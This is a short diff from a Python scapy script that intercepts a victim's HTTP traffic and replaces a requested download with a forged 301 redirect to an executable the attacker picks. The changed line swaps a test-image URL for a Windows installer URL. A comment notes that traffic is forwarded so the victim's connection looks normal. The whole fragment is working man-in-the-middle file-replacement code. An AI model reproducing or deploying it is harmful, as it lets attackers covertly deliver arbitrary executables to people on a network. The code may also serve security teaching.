@@ -39,7 +39,7 @@ def process_packet(packet):
                 if scapy_packet[scapy.TCP].seq in ack_list:
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     print("++Replacing file")
-                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"\n\n")
+                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
                     packet.set_payload(str(modified_packet))
 
     packet.accept() #forward packets to target, connectivity seems normal
